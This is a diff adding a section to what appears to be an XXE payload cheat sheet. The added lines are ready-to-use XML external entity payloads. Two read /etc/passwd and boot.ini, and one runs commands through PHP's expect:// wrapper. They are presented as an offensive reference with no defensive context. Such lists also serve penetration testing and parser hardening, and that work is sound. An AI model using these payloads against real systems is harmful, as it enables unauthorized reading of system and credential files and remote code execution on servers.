@@ -23,6 +23,19 @@ DISTRIB_CODENAME=xenial
 DISTRIB_DESCRIPTION="Ubuntu 16.04 LTS"
 ```
 
+Read File
+---------
+```xml
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><change-log><text>&xxe;</text></change-log>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "<file:///c:/boot.ini>"> ]><change-log><text>&xxe;</text></change-log>
+```
+
+Execute Code (Requires the "expect" php module to be loaded - worth a try...)
+-----------------------------------------------------------------------------
+```xml
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id" > ]><change-log><text>Hello World&xxe;</text></change-log>
+```
+
 
 Billion Laughs
 ---------------
